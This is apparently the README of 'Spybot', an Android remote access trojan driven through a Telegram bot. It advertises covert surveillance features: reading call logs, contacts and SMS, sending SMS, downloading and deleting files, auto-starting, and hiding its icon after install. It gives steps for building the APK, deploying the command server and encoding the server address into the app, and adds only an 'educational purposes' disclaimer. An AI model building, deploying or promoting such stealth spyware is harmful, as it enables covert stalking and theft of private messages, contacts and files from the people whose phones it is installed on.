<h1 align="center">Spybot v1.0.0</h1>

<p align="center"><i>Headless Edition - Lightweight Android RAT with Telegram bot</i></p>

<p align="center">
  <img src="https://img.shields.io/badge/Version-1.0.0-stable?style=for-the-badge&color=blue" />
  <img src="https://img.shields.io/badge/Status-Stable-brightgreen?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Android-5.0+-green?style=for-the-badge&logo=android" />
  <img src="https://img.shields.io/badge/Kotlin-1.9-purple?style=for-the-badge&logo=kotlin" />
</p>

---

## Features

| Feature | Description |
|---------|-------------|
| 📞 Call Log | Read call history |
| 👥 Contacts | Get all contacts |
| 💬 SMS | Read, send, broadcast SMS |
| 📁 File Manager | Download & delete files |
| 🔄 Auto-Start | Boot, network, screen triggers |
| 🛡️ Headless | No UI, auto-hide after install |
| 👻 Stealth | Icon hidden after first launch |

---

## Quick Start

### 1. Deploy Server & Build APK

1. Fork this repository
2. Go to **Actions** → **Deploy Server & Build APK**
3. Click **Run workflow**
4. Set duration and build type
5. Download APK from **Artifacts**

### 2. Local Build

```bash
# Server
cd server && npm install && npm start

# App - Configure server URL first
# Edit: app/app/src/main/java/com/spybot/app/Utils/AppTools.kt
# Set DEFAULT_DATA with your Base64 encoded JSON

cd app && ./gradlew assembleRelease
```

### 3. Configuration

Generate Base64 config:
```bash
echo -n '{"host":"https://server.com/","socket":"wss://server.com/"}' | base64
```

Paste into `AppTools.kt`:
```kotlin
private const val DEFAULT_DATA = "your_base64_here"
```

---

## Requirements

- Android Studio Hedgehog+
- JDK 17
- Node.js 20+
- Telegram Bot Token

---

## Project Structure

```
Spybot/
├── app/                    # Android App (Headless)
│   └── app/src/main/java/com/spybot/app/
│       ├── MainActivity.kt     # Permission handler
│       ├── MainService.kt      # Core service
│       ├── Receiver/           # Boot, SMS, Network
│       └── Utils/              # Socket, Actions, Tools
├── server/                 # Node.js Server
│   ├── server.js
│   └── package.json
└── .github/workflows/      # CI/CD
```

---

## Disclaimer

> ⚠️ This tool is for **educational purposes only**.
> Use only on devices you own or have permission to control.

---

<p align="center">
  <b>Spybot v1.0.0 - Headless Edition</b>
</p>
